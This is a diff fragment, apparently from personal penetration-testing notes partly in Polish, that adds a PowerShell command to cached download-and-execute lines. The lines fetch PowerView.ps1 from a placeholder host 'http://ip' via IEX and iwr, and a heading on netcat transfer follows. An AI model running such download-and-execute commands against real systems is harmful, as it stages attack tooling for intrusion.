@@ -40,6 +40,10 @@ IEX (New-Object System.Net.Webclient).DownloadString('http://ip/powerview.ps1')
 iwr -uri http://ip/powerview.ps1 -OutFile pv.ps1
 ```
 
+```powershell
+$power = (New-Object System.Net.Webclient).DownloadString('http://ip/powerview.ps1')
+
+```
 
 
 # Przeslanie nc
